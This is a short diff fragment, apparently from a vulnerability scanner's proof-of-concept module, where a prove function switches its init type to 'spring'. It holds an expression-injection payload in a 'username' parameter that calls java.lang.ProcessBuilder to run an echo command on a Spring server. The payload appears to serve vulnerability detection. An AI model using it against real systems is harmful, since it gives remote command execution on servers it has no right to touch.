@@ -12,7 +12,7 @@ def info(data=None):
     return info
 
 def prove(data):
-    data = init(data,'web')
+    data = init(data,'spring')
     if data['url']:
         try:
             datas = ['username[(#root.getClass().forName("java.lang.ProcessBuilder").getConstructor(\'foo\'.split('').getClass()).newInstance(\'ecxxho%20springxx_test\'.split(\'xx\'))).start()]=test',
